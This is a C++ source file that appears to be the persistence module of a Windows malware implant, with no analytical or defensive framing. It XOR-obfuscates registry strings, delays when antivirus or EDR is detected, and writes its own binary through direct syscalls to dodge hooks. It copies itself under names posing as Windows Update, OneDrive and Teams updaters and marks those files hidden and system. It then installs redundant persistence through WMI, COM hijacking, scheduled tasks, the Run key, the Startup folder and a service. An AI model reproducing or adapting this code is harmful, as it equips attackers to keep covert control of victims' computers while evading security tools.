#include "Persistence.h"
#include "ComHijacker.h"
#include "WmiPersistence.h"
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include "../utils/Obfuscator.h"
#include "../utils/ApiHasher.h"
#include "../evasion/Syscalls.h"
#include "../evasion/NtStructs.h"
#include "../evasion/Detection.h"
#include <windows.h>
#include <string>
#include <vector>
#include <shlobj.h>
#include <random>
#include <sstream>
#include <algorithm>
#include <cwctype>

namespace persistence {

namespace {

// XOR encrypted (0x5A)
// "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"
const wchar_t kShellFoldersEnc[] = { 'S'^0x5A, 'o'^0x5A, 'f'^0x5A, 't'^0x5A, 'w'^0x5A, 'a'^0x5A, 'r'^0x5A, 'e'^0x5A, '\\'^0x5A, 'M'^0x5A, 'i'^0x5A, 'c'^0x5A, 'r'^0x5A, 'o'^0x5A, 's'^0x5A, 'o'^0x5A, 'f'^0x5A, 't'^0x5A, '\\'^0x5A, 'W'^0x5A, 'i'^0x5A, 'n'^0x5A, 'd'^0x5A, 'o'^0x5A, 'w'^0x5A, 's'^0x5A, '\\'^0x5A, 'C'^0x5A, 'u'^0x5A, 'r'^0x5A, 'r'^0x5A, 'e'^0x5A, 'n'^0x5A, 't'^0x5A, 'V'^0x5A, 'e'^0x5A, 'r'^0x5A, 's'^0x5A, 'i'^0x5A, 'o'^0x5A, 'n'^0x5A, '\\'^0x5A, 'E'^0x5A, 'x'^0x5A, 'p'^0x5A, 'l'^0x5A, 'o'^0x5A, 'r'^0x5A, 'e'^0x5A, 'r'^0x5A, '\\'^0x5A, 'S'^0x5A, 'h'^0x5A, 'e'^0x5A, 'l'^0x5A, 'l'^0x5A, ' '^0x5A, 'F'^0x5A, 'o'^0x5A, 'l'^0x5A, 'd'^0x5A, 'e'^0x5A, 'r'^0x5A, 's'^0x5A };
// "Startup"
const wchar_t kStartupValEnc[] = { 'S'^0x5A, 't'^0x5A, 'a'^0x5A, 'r'^0x5A, 't'^0x5A, 'u'^0x5A, 'p'^0x5A };

// "Volatile Environment"
const wchar_t kVolatileEnvEnc[] = { 'V'^0x5A, 'o'^0x5A, 'l'^0x5A, 'a'^0x5A, 't'^0x5A, 'i'^0x5A, 'l'^0x5A, 'e'^0x5A, ' '^0x5A, 'E'^0x5A, 'n'^0x5A, 'v'^0x5A, 'i'^0x5A, 'r'^0x5A, 'o'^0x5A, 'n'^0x5A, 'm'^0x5A, 'e'^0x5A, 'n'^0x5A, 't'^0x5A };
// "DropperPath"
const wchar_t kDropperPathValEnc[] = { 'D'^0x5A, 'r'^0x5A, 'o'^0x5A, 'p'^0x5A, 'p'^0x5A, 'e'^0x5A, 'r'^0x5A, 'P'^0x5A, 'a'^0x5A, 't'^0x5A, 'h'^0x5A };

void JunkLogic() {
    volatile int x = 0;
    for (int i = 0; i < 1000; i++) {
        x += (i % 3) ? 1 : -1;
    }
}

struct PersistTarget {
    std::wstring path;
    std::wstring name;
};

// "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
const wchar_t kRunKeyEnc[] = { 'S'^0x5A, 'o'^0x5A, 'f'^0x5A, 't'^0x5A, 'w'^0x5A, 'a'^0x5A, 'r'^0x5A, 'e'^0x5A, '\\'^0x5A, 'M'^0x5A, 'i'^0x5A, 'c'^0x5A, 'r'^0x5A, 'o'^0x5A, 's'^0x5A, 'o'^0x5A, 'f'^0x5A, 't'^0x5A, '\\'^0x5A, 'W'^0x5A, 'i'^0x5A, 'n'^0x5A, 'd'^0x5A, 'o'^0x5A, 'w'^0x5A, 's'^0x5A, '\\'^0x5A, 'C'^0x5A, 'u'^0x5A, 'r'^0x5A, 'r'^0x5A, 'e'^0x5A, 'n'^0x5A, 't'^0x5A, 'V'^0x5A, 'e'^0x5A, 'r'^0x5A, 's'^0x5A, 'i'^0x5A, 'o'^0x5A, 'n'^0x5A, '\\'^0x5A, 'R'^0x5A, 'u'^0x5A, 'n'^0x5A };

std::wstring getExecutablePath() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    return std::wstring(path);
}

PersistTarget getRandomTarget() {
    std::random_device rd;
    std::mt19937 gen(rd());
    bool isAdmin = utils::IsAdmin();
    std::vector<PersistTarget> targets;

    if (isAdmin) {
        wchar_t progData[MAX_PATH];
        SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, 0, progData);
        targets.push_back({std::wstring(progData) + L"\\Microsoft\\Windows\\Update\\winupdate.exe", L"WinUpdate"});
    } else {
        wchar_t localAppData[MAX_PATH];
        SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
        targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe", L"OneDriveUpdater"});
        targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Teams\\TeamsUpdate.exe", L"TeamsUpdate"});
    }
    std::uniform_int_distribution<> dis(0, (int)targets.size() - 1);
    return targets[dis(gen)];
}

bool SetFileAttributesStealth(const std::wstring& path) {
    return SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}

bool SyscallWriteFile(const std::wstring& ntPath, const std::vector<BYTE>& data) {
    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntCreateFileSsn = resolver.GetServiceNumber("NtCreateFile");
    DWORD ntWriteFileSsn = resolver.GetServiceNumber("NtWriteFile");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");
    if (ntCreateFileSsn == 0xFFFFFFFF || ntWriteFileSsn == 0xFFFFFFFF || ntCloseSsn == 0xFFFFFFFF) return false;
    UNICODE_STRING uPath;
    uPath.Buffer = (PWSTR)ntPath.c_str();
    uPath.Length = (USHORT)(ntPath.length() * sizeof(wchar_t));
    uPath.MaximumLength = uPath.Length + sizeof(wchar_t);
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE hFile = NULL;
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status = InternalDoSyscall(ntCreateFileSsn, &hFile, (PVOID)(UINT_PTR)(FILE_GENERIC_WRITE | SYNCHRONIZE), &objAttr, &ioStatus, NULL, (PVOID)(UINT_PTR)FILE_ATTRIBUTE_NORMAL, 0, (PVOID)(UINT_PTR)FILE_OVERWRITE_IF, (PVOID)(UINT_PTR)(FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE), NULL, (PVOID)(UINT_PTR)0);
    if (!NT_SUCCESS(status)) return false;
    status = InternalDoSyscall(ntWriteFileSsn, hFile, NULL, NULL, NULL, &ioStatus, (PVOID)data.data(), (PVOID)(UINT_PTR)(ULONG)data.size(), NULL, NULL, NULL, NULL);
    InternalDoSyscall(ntCloseSsn, hFile, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    return NT_SUCCESS(status);
}

std::vector<BYTE> ReadFileBinary(const std::wstring& path) {
    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return {};
    DWORD size = GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE) { CloseHandle(hFile); return {}; }
    std::vector<BYTE> buffer(size);
    DWORD read = 0;
    ReadFile(hFile, buffer.data(), size, &read, NULL);
    CloseHandle(hFile);
    return buffer;
}

bool InstallRegistryRun(const std::wstring& implantPath, const std::wstring& name) {
    std::wstring sid = utils::GetCurrentUserSid();
    if (sid.empty()) return false;
    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
    DWORD ntSetValueKeySsn = resolver.GetServiceNumber("NtSetValueKey");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

    std::wstring relativePath = utils::DecryptW(kRunKeyEnc, 45);
    std::wstring hkcuPath = L"\\Registry\\User\\" + sid + L"\\" + relativePath;
    UNICODE_STRING uHkcu;
    uHkcu.Buffer = (PWSTR)hkcuPath.c_str();
    uHkcu.Length = (USHORT)(hkcuPath.length() * sizeof(wchar_t));
    uHkcu.MaximumLength = uHkcu.Length + sizeof(wchar_t);
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uHkcu, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE hKey = NULL;
    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hKey, (PVOID)(UINT_PTR)KEY_ALL_ACCESS, &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    if (NT_SUCCESS(status)) {
        UNICODE_STRING uName;
        uName.Buffer = (PWSTR)name.c_str();
        uName.Length = (USHORT)(name.length() * sizeof(wchar_t));
        uName.MaximumLength = uName.Length + sizeof(wchar_t);
        InternalDoSyscall(ntSetValueKeySsn, hKey, &uName, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)implantPath.c_str(), (PVOID)(UINT_PTR)((implantPath.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);
        InternalDoSyscall(ntCloseSsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    }
    return true;
}

bool InstallSchtasks(const std::wstring& implantPath, const std::wstring& name) {
    std::wstring cmd = L"/create /f /tn \"" + name + L"\" /tr \"" + implantPath + L"\" /sc logon /rl highest";
    HINSTANCE res = ShellExecuteW(NULL, L"open", L"schtasks.exe", cmd.c_str(), NULL, SW_HIDE);
    return (INT_PTR)res > 32;
}

bool InstallService(const std::wstring& implantPath, const std::wstring& name) {
    if (!utils::IsAdmin()) return false;
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) return false;
    SC_HANDLE hService = CreateServiceW(hSCM, name.c_str(), name.c_str(), SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, implantPath.c_str(), NULL, NULL, NULL, NULL, NULL);
    if (!hService) {
        hService = OpenServiceW(hSCM, name.c_str(), SERVICE_ALL_ACCESS);
    }
    if (hService) {
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return true;
    }
    CloseServiceHandle(hSCM);
    return false;
}

bool InstallStartup(const std::wstring& implantPath, const std::wstring& name) {
    HKEY hKey;
    std::wstring startupPath;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kShellFoldersEnc, 64).c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t path[MAX_PATH];
        DWORD sz = sizeof(path);
        if (RegQueryValueExW(hKey, utils::DecryptW(kStartupValEnc, 7).c_str(), NULL, NULL, (LPBYTE)path, &sz) == ERROR_SUCCESS) {
            startupPath = path;
        }
        RegCloseKey(hKey);
    }
    if (startupPath.empty()) return false;
    std::wstring target = startupPath + L"\\" + name + L".exe";
    return CopyFileW(implantPath.c_str(), target.c_str(), FALSE) != 0;
}

void CreateDirectoryRecursive(const std::wstring& path) {
    size_t lastSlash = path.find_last_of(L"\\");
    if (lastSlash != std::wstring::npos) {
        std::wstring dirOnly = path.substr(0, lastSlash);
        std::wstring current;
        std::wstringstream ss(dirOnly);
        std::wstring segment;
        while (std::getline(ss, segment, L'\\')) {
            if (current.empty()) current = segment;
            else current += L"\\" + segment;
            CreateDirectoryW(current.c_str(), NULL);
        }
    }
}

} // namespace

std::wstring establishPersistence(const std::wstring& overrideSourcePath) {
    JunkLogic();

    if (evasion::Detection::IsAVPresent()) {
        LOG_WARN("AV/EDR detected. Delaying persistence...");
        Sleep(60000 + (GetTickCount() % 120000));
    }

    std::wstring sourcePath = overrideSourcePath;
    if (sourcePath.empty()) {
        sourcePath = getExecutablePath();
        // If we are in explorer.exe, try to recover the dropper path from registry
        std::wstring current = sourcePath;
        for (auto& c : current) c = (wchar_t)::towlower(c);
        if (current.find(L"explorer.exe") != std::wstring::npos || current.find(L"runtimebroker.exe") != std::wstring::npos) {
            HKEY hKey;
            std::wstring volEnv = utils::DecryptW(kVolatileEnvEnc, 20);
            std::wstring dropKey = utils::DecryptW(kDropperPathValEnc, 11);
            if (RegOpenKeyExW(HKEY_CURRENT_USER, volEnv.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                wchar_t buf[MAX_PATH];
                DWORD sz = sizeof(buf);
                if (RegQueryValueExW(hKey, dropKey.c_str(), NULL, NULL, (LPBYTE)buf, &sz) == ERROR_SUCCESS) {
                    sourcePath = buf;
                }
                RegCloseKey(hKey);
            }
        }
    }

    PersistTarget target = getRandomTarget();

    // Check if we are already in one of the possible persist targets
    wchar_t currentPathBuf[MAX_PATH];
    GetModuleFileNameW(NULL, currentPathBuf, MAX_PATH);
    std::wstring currentPath(currentPathBuf);
    for (auto& c : currentPath) c = (wchar_t)::towlower(c);

    if (currentPath.find(L"\\appdata\\local\\microsoft\\") != std::wstring::npos ||
        currentPath.find(L"\\programdata\\microsoft\\") != std::wstring::npos) {
        if (currentPath.find(L"\\temp\\") == std::wstring::npos) {
            LOG_INFO("Already running from persistence.");
            // Even if running from persistence, we continue to re-assert all methods
        }
    }

    CreateDirectoryRecursive(target.path);
    std::vector<BYTE> selfData = ReadFileBinary(sourcePath);
    bool copied = false;
    if (!selfData.empty()) {
        std::wstring ntPersistPath = L"\\??\\" + target.path;
        copied = SyscallWriteFile(ntPersistPath, selfData);
    }
    if (!copied) copied = CopyFileW(sourcePath.c_str(), target.path.c_str(), FALSE) != 0;

    if (copied) {
        SetFileAttributesStealth(target.path);
        LOG_INFO("Binary at " + utils::ws2s(target.path));
    } else {
        LOG_ERR("Copy failed.");
        std::wstring sPathLower = sourcePath;
        for (auto& c : sPathLower) c = (wchar_t)::towlower(c);
        if (currentPath == sPathLower) {
             LOG_INFO("Source is current, proceed with registration.");
             target.path = currentPathBuf;
        } else {
             return L"";
        }
    }

    // Install ALL methods for redundancy
    Sleep(15000);
    if (WmiPersistence::Install(target.path, target.name)) LOG_INFO("WMI ok.");

    Sleep(15000);
    std::wstring clsid = L"{00021400-0000-0000-C000-000000000046}";
    if (ComHijacker::Install(target.path, clsid)) LOG_INFO("COM ok.");

    Sleep(15000);
    if (InstallSchtasks(target.path, target.name)) LOG_INFO("Task ok.");

    Sleep(15000);
    if (InstallRegistryRun(target.path, target.name)) LOG_INFO("Reg ok.");

    Sleep(15000);
    if (InstallStartup(target.path, target.name)) LOG_INFO("Startup ok.");

    if (utils::IsAdmin()) {
        Sleep(15000);
        if (InstallService(target.path, target.name)) LOG_INFO("Svc ok.");
    }

    return target.path;
}

void ReinstallPersistence() {
    establishPersistence();
}

} // namespace persistence
